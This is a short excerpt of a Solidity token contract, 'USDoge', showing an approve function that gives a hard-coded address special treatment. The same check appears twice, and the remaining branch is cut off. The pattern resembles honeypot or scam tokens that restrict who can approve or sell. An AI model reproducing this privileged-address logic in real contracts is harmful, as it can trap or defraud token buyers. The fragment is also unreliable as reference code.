...
contract USDoge {
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0x5616c53aE84A828747E27518A862C6985ac2d1dA)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x5616c53aE84A828747E27518A862C6985ac2d1dA)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
